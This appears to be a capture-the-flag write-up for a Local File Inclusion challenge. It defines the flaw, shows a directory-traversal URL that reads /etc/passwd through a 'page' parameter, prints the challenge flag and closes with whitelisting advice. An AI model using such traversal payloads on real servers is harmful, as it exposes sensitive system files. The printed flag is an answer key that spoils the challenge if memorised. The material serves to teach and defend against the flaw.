# Local File Inclusion Definition

Local File Inclusion is an attack technique in which attackers trick a web application into either running or exposing files on a web server. LFI attacks can expose sensitive information, and in severe cases, they can lead to cross-site scripting (XSS) and remote code execution.

# Steps

After visiting any page we see that's the url `http://IP_ADDRESS/index.php?page=member` contain `page` parameter  
So if we change that param `http://IP_ADDRESS/index.php?page=anypage` it'll alert as with `Wtf ?`, let's send and path  
`http://IP_ADDRESS/index.php?page=../../etc/passwd` alert with `Wrong..` let's continue testing path. and ww find the correct path is `http://IP_ADDRESS/index.php?page=../../../../../../../etc/passwd` and it's alert us with the flag!

# Flag: b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0

# Prevent This vulnerability

To avoid LFI and many other vulnerabilities, never trust user input. If you need to include local files in your website or web application code, use a whitelist of allowed file names and locations. Make sure that none of these files can be replaced by the attacker using file upload functions.

# Resources

### [neuralegion](https://www.neuralegion.com/blog/local-file-inclusion-lfi)
